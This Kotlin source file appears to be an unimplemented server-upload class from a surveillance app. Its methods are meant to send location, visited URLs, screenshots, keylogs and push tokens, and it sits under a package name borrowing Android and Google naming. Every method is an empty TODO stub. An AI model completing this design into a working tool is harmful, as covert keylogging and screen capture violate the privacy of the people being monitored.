package com.android.google.remote

import com.android.google.remote.models.*

class ServerService: RemoteService {

    override suspend fun sendPushToken(token: PushTokenDTO) {
        TODO("Not yet implemented")
    }

    override suspend fun sendLocation(location: LocationDTO) {
        TODO("Not yet implemented")
    }

    override suspend fun sendUrl(urlDTO: UrlDTO) {
        TODO("Not yet implemented")
    }

    override suspend fun sendScreenshot(screenshotDTO: ScreenshotDTO) {
        TODO("Not yet implemented")
    }

    override suspend fun sendKeyLog(keyLog: KeyLogDTO) {
        TODO("Not yet implemented")
    }

}